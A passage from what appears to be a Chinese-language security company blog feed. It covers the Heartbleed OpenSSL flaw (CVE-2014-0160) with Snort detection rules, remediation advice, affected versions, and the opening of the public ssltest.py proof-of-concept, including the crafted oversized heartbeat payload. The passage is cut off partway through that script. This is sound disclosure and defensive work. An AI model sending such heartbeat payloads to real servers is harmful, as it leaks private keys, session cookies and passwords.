&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30511; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL TLSv1.1 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 02|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30512; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL TLSv1.2 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 03|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30513; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER SSLv3 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 00|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30514; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER TLSv1 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 01|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30515; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER TLSv1.1 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 02|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30516; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER TLSv1.2 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 03|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30517; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;section-6&quot;&gt;民眾與管理者應對措施&lt;/h3&gt;

&lt;p&gt;不少朋友來信、留言洽詢，到底自己該怎麼針對這次的漏洞應變？我們簡單就一般民眾以及系統管理者說明。&lt;/p&gt;

&lt;h3 id=&quot;section-7&quot;&gt;一般民眾應對措施&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;注意常用的重要網站服務，是否有針對 Heartbleed 漏洞的更新措施。不少大公司都有發出公告、公告信等。&lt;/li&gt;
  &lt;li&gt;若常用網站服務有遭遇此風險，記得更換帳號密碼。&lt;/li&gt;
  &lt;li&gt;若這段時間有網站通知更換密碼，也請注意是否為釣魚信件。&lt;/li&gt;
  &lt;li&gt;注意自己的帳號是否有異常活動。&lt;/li&gt;
  &lt;li&gt;若使用的網站服務就是不更新，&lt;strong&gt;一天一信友善提醒管理者&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-8&quot;&gt;系統管理者應對措施&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;更新 OpenSSL 至 1.0.1g 或 1.0.2-beta2，並密切注意有無後續更新。&lt;/li&gt;
  &lt;li&gt;重新產生金鑰（Private Key 可能外洩）、Session（Session ID 可能外洩）、密碼（密碼也可能外洩），並且撤銷原本的金鑰。&lt;/li&gt;
  &lt;li&gt;若無法更新，重新編譯 OpenSSL 以關閉 heartbeat 功能。&lt;/li&gt;
  &lt;li&gt;使用 &lt;a href=&quot;http://en.wikipedia.org/wiki/Forward_secrecy&quot;&gt;Perfect Forward Secrecy (PFS)&lt;/a&gt;，在未來類似風險發生時減低傷害。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;許多業者抱持著僥倖的心態，想說外洩的目標不會輪到自己。如果大家看到這幾天&lt;strong&gt;全世界資安人員 / 駭客不眠不休的撈取資料&lt;/strong&gt;，應該會徹底消滅僥倖的想法乖乖做好防護。在漏洞揭露的頭幾天，就已經陸續看到不少駭客進入 Google、Facebook、Yahoo! 等伺服器，並且撰寫大規模掃描工具大量攻擊。除非你有把握自己的伺服器沒有任何連線，不然還是請乖乖更新吧。&lt;/p&gt;

&lt;h3 id=&quot;section-9&quot;&gt;大事件，大啟示&lt;/h3&gt;

&lt;p&gt;還記得之前我們提到的「&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;使用第三方套件所要擔負的資安風險&lt;/a&gt;」？這次的事件就是一個血淋淋的案例。不管是廠商、社群、個人開發者的粗心失誤，或者是國家機器 NSA 的強力滲透，使用各種第三方的套件都需要承擔極大的風險。但可悲的是，我們卻無法不使用。從這次的事件我們可以學到幾件事情：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;不管哪種攻擊手法、多老舊的攻擊手法，在未來都可能會再度發生。&lt;/li&gt;
  &lt;li&gt;程式碼的 review 非常重要，一定要在開發過程中導入程式碼 review 機制，以免開發者寫出含有安全疑慮的程式碼。&lt;/li&gt;
  &lt;li&gt;加密、Session 控管、金鑰控管等議題，是永遠的課題。一天沒處理好，在未來的風險中會再度受害。&lt;/li&gt;
  &lt;li&gt;風險永遠會發生在你猜不到的地方，可能是程式、可能是函式庫、&lt;a href=&quot;http://technews.tw/2013/09/06/most-common-encryption-protocols-are-useless-against-nsa-surveillance/&quot;&gt;可能是加密協定&lt;/a&gt;、更可能是&lt;a href=&quot;http://ckhung0.blogspot.tw/2014/03/dual-ec-drbg.html&quot;&gt;亂數產生器&lt;/a&gt;。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;不斷的增強資安意識、不停的分享新知、廠商做好資安控管及&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;安全檢測&lt;/a&gt;、民眾對企業和政府要求資訊安全，集合大家的力量，是改善資安大環境的不二法門。&lt;/p&gt;

&lt;p&gt;你以為自己逃過一劫了嗎？也許你的身體已經血流如柱，而嗜血的鯊魚正游向你。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞 </title>
   <link href="http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/"/>
   <updated>2014-04-09T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160</id>
   <content type="html">
&lt;h3 id=&quot;openssl-cve-2014-0160-&quot;&gt;OpenSSL CVE-2014-0160 嚴重漏洞&lt;/h3&gt;

&lt;p&gt;OpenSSL 今天公告了一個極度嚴重的漏洞（&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160&quot;&gt;CVE-2014-0160&lt;/a&gt;），被稱為「&lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed&lt;/a&gt;」，而他確實也如同心臟噴出血般嚴重。這個漏洞能讓攻擊者從伺服器記憶體中讀取 64 KB 的資料，利用傳送 heartbeat 的封包給伺服器，在封包中控制變數導致 memcpy 函數複製錯誤的記憶體資料，因而擷取記憶體中可能存在的機敏資料。記憶體中最嚴重可能包含 ssl private key、session cookie、使用者密碼等，因此可能因為這樣的漏洞導致伺服器遭到入侵或取得使用者帳號。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;詳細的分析可以參閱 &lt;a href=&quot;http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html&quot;&gt;existential type crisis : Diagnosis of the OpenSSL Heartbleed Bug&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;軟體名稱：OpenSSL&lt;/li&gt;
  &lt;li&gt;影響範圍：1.0.1 至 1.0.1f / 1.0.2-beta ~ 1.0.2-beta1&lt;/li&gt;
  &lt;li&gt;修復版本：1.0.1g / 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;影響系統版本
    &lt;ul&gt;
      &lt;li&gt;Debian Wheezy (stable), OpenSSL 1.0.1e-2+deb7u4&lt;/li&gt;
      &lt;li&gt;Ubuntu 12.04.4 LTS, OpenSSL 1.0.1-4ubuntu5.11&lt;/li&gt;
      &lt;li&gt;CentOS 6.5, OpenSSL 1.0.1e-15&lt;/li&gt;
      &lt;li&gt;Fedora 18, OpenSSL 1.0.1e-4&lt;/li&gt;
      &lt;li&gt;OpenBSD 5.3 (OpenSSL 1.0.1c 10 May 2012) and 5.4 (OpenSSL 1.0.1c 10 May 2012)&lt;/li&gt;
      &lt;li&gt;FreeBSD 10.0 - OpenSSL 1.0.1e 11 Feb 2013&lt;/li&gt;
      &lt;li&gt;NetBSD 5.0.2 (OpenSSL 1.0.1e)&lt;/li&gt;
      &lt;li&gt;OpenSUSE 12.2 (OpenSSL 1.0.1c)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;影響服務：HTTP、SMTPS、IMAPS、POP3S 等使用 OpenSSL 之服務&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OpenSSL 的公告如下：&lt;a href=&quot;https://www.openssl.org/news/secadv_20140407.txt&quot;&gt;https://www.openssl.org/news/secadv_20140407.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;
A missing bounds check in the handling of the TLS heartbeat extension can be
used to reveal up to 64k of memory to a connected client or server.

Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
1.0.1f and 1.0.2-beta1.
&lt;/pre&gt;

&lt;h3 id=&quot;section&quot;&gt;如何自我檢測？&lt;/h3&gt;

&lt;p&gt;要如何測試自己的網站有沒有這樣的漏洞呢？可以利用以下的網站或工具直接查詢。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed test &lt;a href=&quot;http://filippo.io/Heartbleed/&quot;&gt;http://filippo.io/Heartbleed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;直接輸入 Domain 即可查詢，例如「fbi.gov」。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/w897-h678-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;自我測試工具 &lt;a href=&quot;http://s3.jspenguin.org/ssltest.py&quot;&gt;http://s3.jspenguin.org/ssltest.py&lt;/a&gt; （或 &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;http://pastebin.com/WmxzjkXJ&lt;/a&gt;）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用方法直接執行「python ssltest.py ifttt.com」，或是用「-p」指定特定 SSL 連接埠。畫面上會顯示出記憶體資料，可能內含機敏資料例如 private key、session cookie 等。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/w509-h677-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;原始碼如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The author disclaims copyright to this source code.&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;select&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;optparse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;%prog server [options]&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-p&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;--port&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;int&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;TCP port to test (default: 443)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;16 03 02 00  dc 01 00 00 d8 03 02 53&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 0f 00 01 01                                  &lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;18 03 02 00 03&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;01 40 00&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%02X&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
